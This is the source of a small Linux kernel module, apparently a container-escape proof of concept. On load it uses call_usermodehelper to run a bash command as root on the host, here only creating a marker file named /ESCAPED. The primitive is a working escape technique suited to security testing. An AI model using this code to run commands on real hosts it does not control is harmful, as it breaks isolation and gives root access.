#include<linux/init.h>
#include<linux/module.h>
#include<linux/kmod.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("John Cunniff");

static int init_mod(void){
	char *argv[] = { "/bin/bash", "-c", "touch /ESCAPED", NULL };
	static char *env[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

static void exit_mod(void){
	return;
}

module_init(init_mod);
module_exit(exit_mod);
